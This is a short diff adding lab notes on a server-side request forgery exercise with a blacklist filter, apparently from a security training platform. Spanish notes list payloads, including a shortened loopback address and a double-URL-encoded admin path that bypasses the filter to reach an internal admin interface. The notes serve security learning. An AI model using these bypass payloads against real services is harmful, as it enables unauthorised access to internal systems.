@@ -1,0 +1,16 @@
+Lab: SSRF with blacklist-based input filter
+
+This lab has a stock check feature which fetches data from an internal system.
+
+To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
+
+The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 
+
+Análisis para el exploit:
+------------------------
+1. stockApi=http://127.1 --> 200 ok 
+
+2. stockApi=http://127.1:8080/admin --> "External stock check blocked for security reasons"
+
+2. stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 --> encode 2 veces funciona.
+
